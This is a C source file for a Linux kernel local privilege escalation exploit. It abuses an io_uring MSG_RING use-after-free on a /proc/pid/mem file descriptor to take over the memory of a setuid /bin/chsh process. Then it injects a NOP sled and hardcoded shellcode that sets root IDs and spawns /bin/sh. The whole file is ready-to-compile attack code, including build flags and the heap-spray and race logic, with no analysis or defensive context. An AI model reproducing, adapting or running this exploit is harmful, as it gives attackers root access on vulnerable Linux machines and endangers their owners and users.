// gcc exp_dirtymm.c -o exp_dirtymm -no-pie -static -s -luring -lpthread \
//     -L ./liburing/ -I ./liburing/include

#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <unistd.h>

#include "liburing.h"

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...)                                                         \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                         \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,      \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                         \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,     \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                         \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,        \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                                                          \
    do {                                                                       \
        loge(fmt, ##__VA_ARGS__);                                              \
        loge("Exit at line %d", __LINE__);                                     \
        exit(1);                                                               \
    } while (0)

#define SPRAY_PROCESS_CNT 300

#define RESERVED_STDIN (100)
#define RESERVED_STDOUT (101)
#define RESERVED_STDERR (102)

#define SUID_PROCESS "/bin/chsh"
#define SUID_PROCESS_ARG0 "chsh"

#define NOP_BYTES '\x90'
/**
 * shellcraft.dup2(100, 0) +
 * shellcraft.dup2(101, 1) +
 * shellcraft.dup2(102, 2) +
 * shellcraft.setresuid(0, 0, 0) +
 * shellcraft.setresgid(0, 0, 0) +
 * shellcraft.execve("/bin/sh", ["sh"], 0)
 */
unsigned char payload[] = {
    0x6a, 0x64, 0x5f, 0x31, 0xf6, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x6a, 0x65,
    0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x6a, 0x66, 0x5f,
    0x6a, 0x02, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2,
    0x31, 0xf6, 0x6a, 0x75, 0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x48, 0xb8, 0x01, 0x01, 0x01, 0x01,
    0x01, 0x01, 0x01, 0x01, 0x50, 0x48, 0xb8, 0x2e, 0x63, 0x68, 0x6f, 0x2e,
    0x72, 0x69, 0x01, 0x48, 0x31, 0x04, 0x24, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6,
    0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

int spray_child_sync_pipe[SPRAY_PROCESS_CNT][2];
pid_t child1, child2;
int spray_sync_pipe[2][2];
char dummy;
int mem_rfd, mem_wfd, mem_wfd_2, map_fd;

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void trigger_fd_uaf(int fd) {
#ifndef REQ_F_FIXED_FILE
#define REQ_F_FIXED_FILE 1
#endif
    logd("trigger fd %d UAF ...", fd);

    struct io_uring ring;
    struct io_uring_sqe *sqe;
    io_uring_queue_init(64, &ring, 0);
    io_uring_register_files(&ring, &fd, 1);

    for (int i = 0; i < 2; i++) {
        sqe = io_uring_get_sqe(&ring);
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->flags = REQ_F_FIXED_FILE;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }

    // default mm->count == 4
    logd("utilize dup2() to trigger mmdrop() ...");
    for (int i = 0; i < 4; i++) {
        dup2(fd, 0x100 + i);
        close(0x100 + i);
    }

    // init_task_work(&file->f_u.fu_rcuhead, ____fput);
    logd("wait task ____fput() to free the struct file ...");
    usleep(200 * 1000);
}

void victim_child(void) {
    int dummy_pipe[2];
    pipe(dummy_pipe);
    logd("victim child stuck at read forever ...");
    read(dummy_pipe[0], &dummy, 1);
}

void spary_child(void) {
    for (int i = 0; i < SPRAY_PROCESS_CNT; i++) {
        if (pipe(spray_child_sync_pipe[i]) < 0) {
            die("spray pipe: %m");
        }
    }

    // check reversed fd
    logd("check reserved fd ...");
    for (int i = 0; i < SPRAY_PROCESS_CNT; i++) {
        for (int j = 0; j < 2; j++) {
            if ((spray_child_sync_pipe[i][j] == RESERVED_STDIN) ||
                (spray_child_sync_pipe[i][j] == RESERVED_STDOUT) ||
                (spray_child_sync_pipe[i][j] == RESERVED_STDERR)) {
                logd("find overlap, deal with it ...");
                spray_child_sync_pipe[i][j] = dup(spray_child_sync_pipe[i][j]);
            }
        }
    }

    int null_fd = open("/dev/null", O_RDWR);
    if (null_fd < 0) {
        die("open /dev/null: %m");
    }

    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    for (int i = 0; i < SPRAY_PROCESS_CNT; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            die("spray fork: %m");
        }
        if (!pid) {
            bind_cpu(i % cpu_cores);
            read(spray_child_sync_pipe[i][0], &dummy, 1);

            // child run suid process
            dup2(0, RESERVED_STDIN);
            dup2(1, RESERVED_STDOUT);
            dup2(2, RESERVED_STDERR);
            dup2(spray_child_sync_pipe[i][0], 0);
            dup2(null_fd, 1);
            dup2(null_fd, 2);
            execl(SUID_PROCESS, SUID_PROCESS_ARG0, NULL);
            exit(0);
        }
    }
    bind_cpu(0);

    write(spray_sync_pipe[1][1], "A", 1);
    read(spray_sync_pipe[0][0], &dummy, 1);
    logd("spray child start!");

    for (int i = 0; i < SPRAY_PROCESS_CNT; i++) {
        write(spray_child_sync_pipe[i][1], "A", 1);
    }

    write(spray_sync_pipe[1][1], "A", 1);
    read(spray_sync_pipe[0][0], &dummy, 1);

    logd("resume other suid process ... ");
    for (int i = 0; i < SPRAY_PROCESS_CNT; i++) {
        write(spray_child_sync_pipe[i][1], "asd\n", 4);
    }

    write(spray_sync_pipe[1][1], "A", 1);
}

void parse_map_and_inject_shellcode(int map, int mem) {
    char names[0x1000];
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    size_t start, end;
    char flag[5] = {0};
    size_t dummy_data;

    FILE *map_fp = fdopen(map, "r");

    memset(names, 0, sizeof(names));
    while ((read = getline(&line, &len, map_fp)) != -1) {
        sscanf(line, "%lx-%lx %c%c%c%c %08lx %02lx:%02lx %lu %s", &start, &end,
               flag, flag + 1, flag + 2, flag + 3, &dummy_data, &dummy_data,
               &dummy_data, &dummy_data, names);

        if (flag[2] == 'x') {
            // don't touch vsyscall
            if (start > 0x8000000000000000ULL) {
                continue;
            }

            size_t segment_length = end - start;
            lseek(mem, start, SEEK_SET);
            char *temp_buffer = (char *)malloc(segment_length);
            if (!temp_buffer) {
                die("malloc with size %lx failed: %m", segment_length);
            }
            memset(temp_buffer, NOP_BYTES, segment_length);
            memcpy(temp_buffer + segment_length - sizeof(payload), payload,
                   sizeof(payload));
            ssize_t write_cnt = write(mem, temp_buffer, segment_length);
            if (write_cnt <= 0) {
                loge("write mem count %ld, %m", write_cnt);
            }
            free(temp_buffer);
        }
    }
}

void do_init() {
    logd("do init ...");

    if (pipe(spray_sync_pipe[0]) < 0) {
        die("pipe: %m");
    }
    if (pipe(spray_sync_pipe[1]) < 0) {
        die("pipe: %m");
    }

    // init victim process
    child1 = fork();
    if (child1 < 0) {
        die("fork: %m");
    }
    if (!child1) {
        // child1 go here
        bind_cpu(0);
        victim_child();
        exit(0);
    }

    // init spray process
    child2 = fork();
    if (child2 < 0) {
        die("fork: %m");
    }
    if (!child2) {
        // child2 go here
        bind_cpu(0);
        spary_child();
        exit(0);
    }

    bind_cpu(0);
}

int main(void) {
    do_init();

    char *child1_mem_path;
    char *child1_map_path;
    asprintf(&child1_mem_path, "/proc/%d/mem", child1);
    asprintf(&child1_map_path, "/proc/%d/maps", child1);

    mem_rfd = open(child1_mem_path, O_RDONLY);
    mem_wfd = open(child1_mem_path, O_WRONLY);
    if (mem_wfd < 0) {
        die("open mem_wfd: %m");
    }
    mem_wfd_2 = open(child1_mem_path, O_WRONLY);
    if (mem_wfd_2 < 0) {
        die("open mem_wfd_2: %m");
    }
    map_fd = open(child1_map_path, O_RDONLY);
    if (map_fd < 0) {
        die("open map_fp: %m");
    }

    char *cmdline;
    asprintf(&cmdline, "/proc/%d/cmdline", child1);

    int cmdline_fd = open(cmdline, O_RDONLY);
    if (cmdline_fd < 0) {
        die("open cmdline_fd: %m");
    }

    // wait pre-spray task ...
    read(spray_sync_pipe[1][0], &dummy, 1);

    logd("release child1's mm_struct ...");
    trigger_fd_uaf(mem_wfd);

    // spray start
    write(spray_sync_pipe[0][1], "A", 1);
    read(spray_sync_pipe[1][0], &dummy, 1);

    bool find_cmdline = false;
    for (int i = 0; i < 4; i++) {
        char cmdline_buffer[0x100] = {0};
        lseek(cmdline_fd, 0, SEEK_SET);
        read(cmdline_fd, cmdline_buffer, sizeof(cmdline_buffer));
        logd("get cmdline: %s", cmdline_buffer);
        if (!strncmp(cmdline_buffer, SUID_PROCESS_ARG0,
                     strlen(SUID_PROCESS_ARG0))) {
            find_cmdline = true;
            break;
        }
        usleep(100 * 1000);
    }
    if (!find_cmdline) {
        // resume other suid process
        write(spray_sync_pipe[0][1], "A", 1);
        read(spray_sync_pipe[1][0], &dummy, 1);
        die("suid process mm_struct not overlap");
    }

    logd("parse suid process maps ...");
    parse_map_and_inject_shellcode(map_fd, mem_wfd_2);

    // resume other suid process
    write(spray_sync_pipe[0][1], "A", 1);
    read(spray_sync_pipe[1][0], &dummy, 1);

    logw("main process sleep forever ...");
    while (1) {
        sleep(100);
    }

    return 0;
}